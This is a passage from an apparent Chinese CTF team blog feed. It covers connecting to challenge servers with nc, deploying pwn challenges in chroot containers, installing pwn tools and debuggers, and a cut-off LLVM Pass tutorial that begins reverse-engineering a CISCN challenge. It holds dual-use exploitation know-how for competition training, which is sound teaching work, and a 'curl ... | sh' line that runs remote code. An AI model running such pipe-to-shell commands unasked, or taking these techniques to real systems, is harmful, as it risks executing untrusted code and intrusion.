<br><span class="hljs-comment">#例如本题：./ncat 121.4.113.135 20001</span><br><br><span class="hljs-comment">#cmd命令提示符中使用</span><br>ncat <span class="hljs-variable">&lt;ip&gt;</span> <span class="hljs-variable">&lt;port&gt;</span> <br><span class="hljs-comment">#例如本题：ncat 121.4.113.135 20001</span><br></code></pre></td></tr></table></figure><p><img src="/img/article/nc/image-20220913101045325.png" alt="开始做题吧！"></p><h3 id="Linux-amp-macOS"><a href="#Linux-amp-macOS" class="headerlink" title="Linux &amp; macOS"></a>Linux &amp; macOS</h3><p>在Linux和macOS中，由于系统自带<code>nc</code>功能，我们的操作就很简便了。首先打开「终端」，输入 <code>nc</code>。</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ nc<br>usage: nc <span class="hljs-comment">[-46AacCDdEFhklMnOortUuvz]</span> <span class="hljs-comment">[-K tc]</span> <span class="hljs-comment">[-b boundif]</span> <span class="hljs-comment">[-i interval]</span> <span class="hljs-comment">[-p source_port]</span> <span class="hljs-comment">[--apple-delegate-pid pid]</span> <span class="hljs-comment">[--apple-delegate-uuid uuid]</span><br>  <span class="hljs-comment">[-s source_ip_address]</span> <span class="hljs-comment">[-w timeout]</span> <span class="hljs-comment">[-X proxy_version]</span><br>  <span class="hljs-comment">[-x proxy_address<span class="hljs-comment">[:port]</span>]</span> <span class="hljs-comment">[hostname]</span> <span class="hljs-comment">[port<span class="hljs-comment">[s]</span>]</span><br></code></pre></td></tr></table></figure><p>出现了类似上面的输出，说明我们的系统确实存在<code>nc</code>指令。那么我们只需要如下输入即可，因为我没有mac，所以就没有mac成功运行的截图了😭😭😭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc &lt;ip&gt; &lt;port&gt; <br>//例如这次招新赛：nc 121.4.113.135 20001<br></code></pre></td></tr></table></figure><p><img src="/img/article/nc/image-20220913101349105.png" alt="开始做题吧"></p><h2 id="此外"><a href="#此外" class="headerlink" title="此外"></a>此外</h2><p>在我们使用浏览器上网的时候，我们和服务器使用了 HTTP 协议进行连接。关于 HTTP 协议的更多细节，你需要自己上网搜索。一般来说，默认是 80 端口。</p><p>我们可以使用 <code>nc</code>，尝试一次与网页服务器的连接，以百度为例。</p><p>输入 <code>nc www.baidu.com 80</code>（或者 <code>ncat www.baidu.com 80</code>，或者 <code>./ncat www.baidu.com 80</code>，请根据以上的介绍自行修改），程序会等待你的输入。</p><p>输入 <code>GET / HTTP/1.0</code>。这表示，我们使用 <code>HTTP/1.0</code> 这个协议版本，用 <code>GET</code> 的方式请求根 <code>/</code>。输入两下回车，代表我们的 HTTP 请求完成。如果你的网络畅通，百度的网页服务器会立刻返回大量信息，可以自行搜索，了解它们的含义。现在，你成功（在不使用浏览器的情况下）完成了一次与百度网站的连接！</p><p><img src="/img/article/nc/nc-1024x596.png" alt="Success!"></p><p>如果你成功了，那么你可以开始愉快地完成我们的题目了！</p><p>除了使用 <code>nc</code> 直接与服务器交互之外，也可以编程与服务器交互。例如：</p><ul><li>在信息安全类的竞赛中一个常用的工具是 Python 的 <a href="https://docs.pwntools.com/en/stable/intro.html"><code>pwntools</code></a>，具体使用方法可以自行搜索了解。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>如何安全快速部署多道静态端口PWN题目</title>
    <link href="/2022/09/12/%E9%9D%99%E6%80%81pwn/"/>
    <url>/2022/09/12/%E9%9D%99%E6%80%81pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文部分引用合天网安实验室微信文章，原文链接：<a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652848854&idx=1&sn=ff537cc73e76e1ab058bd36cb76749a0&chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&mpshare=1&scene=1&srcid=1011dGXhepYahcla33btEWte#rd">如何安全快速地部署多道 ctf pwn 比赛题目 (qq.com)</a></p></blockquote><p>我们平时见到的多数PWN题，是采用动态端口，动态flag，这种形式在一定程度上减少了比赛中py的数量。即便有，也是思路py，而不是直接传递flag，提升了py的门槛。但有时受限于环境及服务器负担原因，被迫采用静态端口的PWN也不在少数比如<a href="https://pwnable.tw/challenge/">pwnable.tw</a>以及星盟的<a href="http://pwn.eonew.cn/challenge.php">challenge (eonew.cn)</a></p><p>2022年的招新便是如此，由于疫情被迫线上上课，线上安排比赛，无法使用校内的服务器资源。受限于自身服务器的性能，只好采取如此下策（但还好只是招新，11月的DUTCTF希望能有好点的资源&#x2F;(ㄒoㄒ)&#x2F;~~）</p><p>🆘🆘🆘🆘🆘🆘🆘🆘🆘🆘🆘🆘🆘</p><p><img src="/img/article/static_port/image-20220912135756313.png" alt="可怜的学姐"></p><p>🆘🆘🆘🆘🆘🆘🆘🆘🆘🆘🆘🆘🆘</p><p>幸运的是找到了合天在2018年创建的项目<code>pwn_depoly_chroot</code>，可以非常方便的搭建多个静态题目，且比较安全，用于这种小型比赛以及普通的训练题库都非常合适。</p><h2 id="pwn-depoly-chroot项目介绍"><a href="#pwn-depoly-chroot项目介绍" class="headerlink" title="pwn_depoly_chroot项目介绍"></a>pwn_depoly_chroot项目介绍</h2><blockquote><p>原项目链接：<a href="https://github.com/giantbranch/pwn_deploy_chroot">Github: pwn_depoly_chroot</a></p></blockquote><ul><li><p>一次可以部署多个题目到一个 <code>docker</code> 容器中</p></li><li><p>自动生成 flag,并备份到当前目录(不过需注意是静态的flag)</p></li><li><p>基于 <code>xinted + docker + chroot</code></p></li><li><p>利用 python 脚本根据 PWN 的文件名自动化地生成 3 个文件：<code>pwn.xinetd</code>，<code>Dockerfile</code> 和 <code>docker-compose.yml</code></p></li><li><p>在 &#x2F;bin 目录，利用自己编写的静态编译的 <code>catflag</code> 程序作为 <code>/bin/sh</code>，这样的话，<code>system(&quot;/bin/sh&quot;)</code> 实际执行的只是读取 flag 文件的内容，完全不给搅屎棍任何操作的余地</p></li><li><p>默认从 10000 端口监听，多一个程序就 +1，起始的监听端口可以在 <code>config.py</code> 配置，或者生成 <code>pwn.xinetd 和 docker-compose.yml</code> 后自己修改这两个文件</p></li></ul><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#安装docker</span><br>$ curl -s https://get.docker.com/ | sh<br><br><span class="hljs-comment">#安装 docker compose 和 git</span><br>$ apt install docker-compose git<br><br><span class="hljs-comment">#下载PWN题搭建项目</span><br>$ git <span class="hljs-built_in">clone</span> https://github.com/giantbranch/pwn_deploy_chroot.git<br></code></pre></td></tr></table></figure><h2 id="使用教学"><a href="#使用教学" class="headerlink" title="使用教学"></a>使用教学</h2><p>只需要 3 步：</p><ol><li>将所有 pwn 题目放入 bin 目录（注意名字不带特殊字符，因为会将文件名作为 linux 用户名）</li><li>python initialize.py  </li><li>docker-compose up –build -d</li></ol><h3 id="详细操作："><a href="#详细操作：" class="headerlink" title="详细操作："></a>详细操作：</h3><ul><li><strong>将你要部署的 pwn 题目放到 bin 目录</strong></li></ul><p>这个项目已经将一个程序 copy 了 3 份作为示例，注意文件名不要含有特殊字符，文件名建议使用字母，下划线，横杆和数字，当然全字母的当然最好了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@instance-1:~/pwn_deploy_chroot<span class="hljs-comment"># ls bin/</span><br>pwn1 pwn1_copy1 pwn1_copy2<br></code></pre></td></tr></table></figure><ul><li><strong>运行 initialize.py</strong></li></ul><p>运行脚本后会输出每个 pwn 的监听端口，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@instance-1:~/pwn_deploy_chroot<span class="hljs-comment"># python initialize.py</span><br><br>pwn1<span class="hljs-string">&#x27;s port: 10000</span><br><span class="hljs-string">pwn1_copy1&#x27;</span>s port: 10001<br>pwn1_copy2<span class="hljs-string">&#x27;s port: 10002</span><br></code></pre></td></tr></table></figure><p>文件与端口信息，还有随机生成的 flag 默认备份到 flags.txt </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@instance-1:~/pwn_deploy_chroot<span class="hljs-comment"># cat flags.txt </span><br>pwn1: flag&#123;93aa6da5-db45-46fa-a2e1-af2be6698692&#125;<br>pwn1_copy1: flag&#123;f9966c51-52e4-4212-ac44-97bf16620b41&#125;<br>pwn1_copy2: flag&#123;b17949ce-e3fa-4ca7-9fcc-44b8dc997cb3&#125;<br><br>pwn1<span class="hljs-string">&#x27;s port: 10000</span><br><span class="hljs-string">pwn1_copy1&#x27;</span>s port: 10001<br>pwn1_copy2<span class="hljs-string">&#x27;s port: 10002</span><br></code></pre></td></tr></table></figure><ul><li><strong>启动环境</strong></li></ul><p>请使用 root 用户执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up --build-d<br></code></pre></td></tr></table></figure><p>不出意外，题目就启动起来了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@instance-1:~/pwn_deploy_chroot<span class="hljs-comment"># netstat -antp | grep docker</span><br>tcp6       0     0:::10002               :::*                   LISTEN      19828/docker-proxy<br>tcp6       0     0:::10000               :::*                   LISTEN      19887/docker-proxy<br>tcp6       0     0:::10001               :::*                   LISTEN      19873/docker-proxy<br></code></pre></td></tr></table></figure><p>我们测试一下 pwn1,看看效果</p><p><img src="/img/article/static_port/20220912141715.png" alt="测试示例"></p><p>可以看到，虽然执行的是 <code>system(&quot;/bin/sh&quot;)</code>，但是实际功能只是输出 flag，这样就非常安全了</p><h3 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h3><blockquote><p>如有二次开发意愿或想了解更多详细内容，可自行查看开头的文章链接或github项目链接，内有部分关键代码讲解</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PWN环境搭建（萌新入门）</title>
    <link href="/2022/09/05/%E8%90%8C%E6%96%B0%E6%89%8B%E5%86%8C-PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/09/05/%E8%90%8C%E6%96%B0%E6%89%8B%E5%86%8C-PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="IDA-PRO-反汇编利器"><a href="#IDA-PRO-反汇编利器" class="headerlink" title="IDA PRO-反汇编利器"></a>IDA PRO-反汇编利器</h2><blockquote><p>推荐版本7.6及以上，高版本增添了对于go语言程序的反汇编，寻找资源需要谨慎哦</p><p>写文章的时候顺便看了眼价格，，，，，算了还是自己找资源吧</p></blockquote><p><img src="/img/article/pwn-envir/image-20220905153059189-1662367638683-2.png" alt="image-20220905153059189"></p><p>IDA可以对可执行程序反汇编操作，能够看到整个程序的框架、汇编代码、伪代码、函数调用、以及一些字符串的全局遍变量。无论对于Reverse还是PWN都是最核心的工具之一，这也是我放在最前面提及的原因，大概界面如下图。</p><p><img src="/img/article/pwn-envir/image-20220905153323145.png" alt="image-20220905153323145"></p><h2 id="Linux发行版选择"><a href="#Linux发行版选择" class="headerlink" title="Linux发行版选择"></a>Linux发行版选择</h2><p>这里我主要推荐Ubuntu，相比于其他发行版，Ubuntu的图形化界面比较方便新人入手学习Linux. 另外一方面，CTF中大多数PWN题环境都是在ubuntu下的，一般为近几年的版本。</p><blockquote><p>以2022年PWN题目环境为例，Ubuntu版本基本集中在Ubuntu18，Ubuntu20，Ubuntu22. 同理在2024年，不出意外的话题目环境将会变化为Ubuntu20，Ubuntu22，Ubuntu24. 主要是因为Ubuntu发行为LTS制(Long Term Support)即版本支持年份为6年，且每两年发布一次新版本</p></blockquote><p>那么在选择时就推荐选择距离时间最近的偶数年份版本，比如Ubuntu20或22. Ubuntu系统的iso镜像文件可以自行在网上寻找，也可以在大工镜像网站下载：<a href="http://mirror.dlut.edu.cn/ubuntu-releases/22.04/">大连理工大学开源软件镜像站 (dlut.edu.cn)</a></p><p><img src="/img/article/pwn-envir/image-20220905164622966.png" alt="image-20220905164622966"></p><p>虚拟机安装Windows环境下建议使用VMware。同样建议版本尽量新一些，如VM16以上，这样可以避免一部分的蓝屏BUG发生。</p><blockquote><p>Linux安装教学不在这里赘述了，毕竟本文的核心是PWN环境的搭建，如需安装的相关资源，可自行网络搜索</p></blockquote><h2 id="Pwntools安装"><a href="#Pwntools安装" class="headerlink" title="Pwntools安装"></a>Pwntools安装</h2><p>Ubuntu安装完成后默认应该是有python3的，可以用python -V或python3 -V来查看版本</p><p><img src="/img/article/pwn-envir/image-20220905161539363.png" alt="image-20220905161539363"></p><blockquote><p>这里推荐使用python3, 虽然有人说Pwntools对于python2的适配性更好，但由于python2过于古老，新版本反倒在其他方面更加稳定一些。在拥有其他更多插件和包的情况下，个人感觉还是python3更优一些。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get update<br>$ sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential<br>$ sudo python3 -m pip install --upgrade pip<br>$ sudo python3 -m pip install --upgrade pwntools<br></code></pre></td></tr></table></figure><p>之后我们可以使用<code>import pwn</code>来测试一些是否成功安装,出现下方情况基本就可以了</p><p><img src="/img/article/pwn-envir/image-20220905162034730.png" alt="image-20220905162034730"></p><h2 id="pwndbg-amp-pwngdb安装"><a href="#pwndbg-amp-pwngdb安装" class="headerlink" title="pwndbg &amp; pwngdb安装"></a>pwndbg &amp; pwngdb安装</h2><p>这两个均是GDB的插件之一，用于在Linux对程序进行动态调试，而动态调试也是PWN最核心的部分之一。拥有这些工具，我们能更加方便的查看程序运行过程中，内存变化。如栈、堆、寄存器等等地方的内容。</p><blockquote><p>pwndbg安装</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br><span class="hljs-built_in">cd</span> pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure><blockquote><p>pwngdb安装</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/<br>git <span class="hljs-built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git <br><span class="hljs-built_in">cp</span> ~/Pwngdb/.gdbinit ~/<br></code></pre></td></tr></table></figure><blockquote><p>注意：上述两个插件并不兼容，但可以通过更改.gdbinit文件切换使用</p><p>.gdbinit文件配置如下</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">source /home/pwnki/pwndbg/gdbinit.<span class="hljs-property">py</span> <br>#source ~<span class="hljs-regexp">/peda/</span>peda.<span class="hljs-property">py</span> <span class="hljs-comment">//使用 pwndbg 就要把 peda 注释掉，反过来也一样</span><br>source ~<span class="hljs-regexp">/Pwngdb/</span>pwngdb.<span class="hljs-property">py</span><br>source ~<span class="hljs-regexp">/Pwngdb/</span>angelheap/gdbinit.<span class="hljs-property">py</span><br><br>define hook-run<br>python<br><span class="hljs-keyword">import</span> angelheap<br>angelheap.<span class="hljs-title function_">init_angelheap</span>()<br>end<br>end<br></code></pre></td></tr></table></figure><p><img src="/img/article/pwn-envir/image-20220905165859512.png" alt="image-20220905165859512"></p><h2 id="checksec安装"><a href="#checksec安装" class="headerlink" title="checksec安装"></a>checksec安装</h2><p>用于检测程序开启了哪些保护机制，往往是PWN解题的第一步，安装方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt install checksec<br></code></pre></td></tr></table></figure><p>使用方式:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ checksec 程序文件<br></code></pre></td></tr></table></figure><p><img src="/img/article/pwn-envir/image-20220905164504590.png" alt="image-20220905164504590"></p><h2 id="更多插件"><a href="#更多插件" class="headerlink" title="更多插件"></a>更多插件</h2><blockquote><p>虽然还有很多插件并没有提及，但对于刚刚接触pwn的同学来说，以上插件已经够完成一部分简单的pwn题目，更多的插件需要在将来自己学习的过程中慢慢补充。下面只做一列举，有兴趣的同学可以自行搜索查看</p></blockquote><h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><blockquote><p>可以用于下载各种版本的glibc文件，在本地模拟其他libc环境时非常实用</p></blockquote><h3 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h3><blockquote><p>用于检测程序沙盒防护开启情况，往往在一些会用到ORW等方法解题时会用来检测</p></blockquote><h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><blockquote><p>这个工具可以用查找libc中可以用来getshell的片段地址，在各类题目中都应用广泛</p></blockquote><h3 id="LibcSeacher"><a href="#LibcSeacher" class="headerlink" title="LibcSeacher"></a>LibcSeacher</h3><blockquote><p>该工具往往用于确定libc版本并确定其libc版本下的函数偏移，可以被网页端的libc库替代</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>LLVM PASS环境搭建与基本使用</title>
    <link href="/2022/06/30/LLVM%20Pass%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/06/30/LLVM%20Pass%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="LLVM-Pass-环境搭建"><a href="#LLVM-Pass-环境搭建" class="headerlink" title="LLVM Pass 环境搭建"></a>LLVM Pass 环境搭建</h2><h3 id="预编译包的安装"><a href="#预编译包的安装" class="headerlink" title="预编译包的安装"></a>预编译包的安装</h3><p>在Ubuntu上，可以直接通过<code>apt</code>安装llvm和clang：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt install llvm<br>$ sudo apt install clang<br></code></pre></td></tr></table></figure><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> llvm-project<br>$ <span class="hljs-built_in">mkdir</span> build &amp;&amp; <span class="hljs-built_in">cd</span> build<br>$ cmake -G <span class="hljs-string">&quot;Unix Makefiles&quot;</span> -DLLVM_ENABLE_PROJECTS=<span class="hljs-string">&quot;clang&quot;</span> \<br>    -DCMAKE_BUILD_TYPE=Release -DLLVM_TARGETS_TO_BUILD=<span class="hljs-string">&quot;X86&quot;</span> \<br>    -DBUILD_SHARED_LIBS=On ../llvm<br>$ make<br></code></pre></td></tr></table></figure><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="Hello-Pass-编写"><a href="#Hello-Pass-编写" class="headerlink" title="Hello Pass 编写"></a>Hello Pass 编写</h3><p>随意找一处作为项目文件夹Hello，并编写main.c如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">loorain</span><span class="hljs-params">()</span>&#123;&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwn</span><span class="hljs-params">()</span>&#123;&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello World LLVM PASS&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写Hello.cpp如下，如下代码含义可阅读官方文档：<a href="https://llvm.org/docs/WritingAnLLVMPass.html#introduction-what-is-a-pass">Writing an LLVM Pass — LLVM 15.0.0git documentation</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Pass.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/Function.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Hello</span> : <span class="hljs-keyword">public</span> FunctionPass &#123;<br>        <span class="hljs-type">static</span> <span class="hljs-type">char</span> ID;<br>        <span class="hljs-built_in">Hello</span>() : <span class="hljs-built_in">FunctionPass</span>(ID) &#123;&#125;<br>        <br>        <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">runOnFunction</span><span class="hljs-params">(Function &amp;F)</span> <span class="hljs-keyword">override</span> </span>&#123;<br>            <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;Hello: &quot;</span>;<br>            <span class="hljs-built_in">errs</span>().<span class="hljs-built_in">write_escaped</span>(F.<span class="hljs-built_in">getName</span>()) &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<span class="hljs-comment">//遍历所有的函数名称，并以“Hello：&lt;函数名&gt;”的形式输出</span><br>    &#125;;<br>&#125;<br><br><span class="hljs-type">char</span> Hello::ID = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//for opt</span><br><span class="hljs-function"><span class="hljs-type">static</span> RegisterPass&lt;Hello&gt; <span class="hljs-title">X</span><span class="hljs-params">(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;Hello world Pass&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>)</span></span>;<br><span class="hljs-comment">//for clang</span><br><span class="hljs-function"><span class="hljs-type">static</span> llvm::RegisterStandardPasses <span class="hljs-title">Y</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    llvm::PassManagerBuilder::EP_EarlyAsPossible,</span></span><br><span class="hljs-params"><span class="hljs-function">    [](<span class="hljs-type">const</span> llvm::PassManagerBuilder &amp;Builder,</span></span><br><span class="hljs-params"><span class="hljs-function">       llvm::legacy::PassManagerBase &amp;PM) &#123; PM.add(<span class="hljs-keyword">new</span> Hello()); &#125;)</span></span>;<br></code></pre></td></tr></table></figure><h3 id="命令行编译"><a href="#命令行编译" class="headerlink" title="命令行编译"></a>命令行编译</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`   <br></code></pre></td></tr></table></figure><ul><li><code>llvm-config</code>提供了<code>CXXFLAGS</code>与<code>LDFLAGS</code>参数方便查找LLVM的头文件与库文件。 如果链接有问题，还可以用<code>llvm-config --libs</code>提供动态链接的LLVM库。 具体<code>llvm-config</code>打印了什么，请自行尝试或查找官方文档。</li><li><code>-fPIC -shared</code> 显然是编译动态库的必要参数。</li><li>因为LLVM没用到RTTI，所以用<code>-fno-rtti</code> 来让我们的Pass与之一致。</li><li><code>-Wl,-znodelete</code>主要是为了应对LLVM 5.0+中加载ModulePass引起segmentation fault的bug。如果你的Pass继承了ModulePass，还请务必加上。</li></ul><p>现在，你手中应该有一份编译好的LLVMHello.so了。根据刚才阅读过的官方文档的介绍，你知道可以通过命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang -S -emit-llvm main.c -o main.ll<br><span class="hljs-comment">#这里也可以使用&#x27;clang -c -emit-llvm main.c -o main.bc&#x27;区别在于bc文件是二进制文件无法阅读</span><br><span class="hljs-variable">$opt</span> -load LLVMHello.so -hello main.ll -o main<br><span class="hljs-comment">#这里的 -hello由Hello.cpp中的static RegisterPass&lt;Hello&gt; X参数决定</span><br></code></pre></td></tr></table></figure><blockquote><p>在使用opt进行动态链接时，可能会出现错误：Error opening ‘LLVMHello.so’: LLVMHello.so: cannot open shared object file: No such file or directory</p><p>这实际是由于linux中动态链接库的存放地点一般比较固定，无法在默认地址搜索到名为LLVMHello.so的动态链接库，那么我们可以在.bashrc或.zshrc中加入代表当前目录的地址，如下所示：</p><p>export LD_LIBRARY_PATH&#x3D;$LD_LIBRARY_PATH:.  </p></blockquote><p><img src="/img/article/llvmCreate/1.png" alt="效果图"></p><p>如图所示，我们确实输出了main.c中所有函数名称</p><h2 id="例题一：CISCN-2021-SATool"><a href="#例题一：CISCN-2021-SATool" class="headerlink" title="例题一：CISCN 2021 SATool"></a>例题一：CISCN 2021 SATool</h2><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>这类题目对我们有用的部分opt和so文件，逆向分析SAPass.so文件</p><p><img src="/img/article/llvmCreate/image-20220630204900814.png" alt="image-20220630204900814"></p><p>在<code>start</code>函数中，主要内容是注册了一些函数，没什么有用的信息。在分析so文件时，一般重点是分析重写的<code>runOnFunction</code>函数，我们大多可以在函数表的最下方找到重写的<code>runOnFunction</code>函数</p><p><img src="/img/article/llvmCreate/image-20220630205306216.png" alt="image-20220630205306216"></p><p>在这里我们看到<code>sub_19D0</code>就是我们要找的函数，分析函数内容，这也是在我看来LLVM PASS 类题目最核心的地方——代码逆向分析。毕竟一个函数就要整整550行，能够快速地筛选什么是关键信息，什么是垃圾信息是关键。</p><p><img src="/img/article/llvmCreate/image-20220630210526791.png" alt="image-20220630210526791"></p><p>函数一开头就判断了我们的函数名称是不是<code>B4ckDo0r</code>, 这里由于Name的类型是QWORD存储，并非直接字符串，所以要反过来读。之后又分了5个操作分别是save, takeway, stealkey, fakekey, run.</p><p>在save操作中，进行了堆块的创建</p><p><img src="/img/article/llvmCreate/image-20220630211613541.png" alt="image-20220630211613541"></p><p>在stealkey中，将刚刚申请的heap中内容给了204100（takeway也是跳转到了stealkey中）</p><p><img src="/img/article/llvmCreate/image-20220630211950647.png" alt="image-20220630211950647"></p><p>在fakekey中，将heap的内容加上了参数的值，即可编辑heap的内容（这里的heap_con就是204100，我改了个名字）</p><p><img src="/img/article/llvmCreate/image-20220630212337680.png" alt="image-20220630212337680"></p><p>run函数，就是直接call *heap</p><p><img src="/img/article/llvmCreate/image-20220630213353185.png" alt="image-20220630213353185"></p><h3 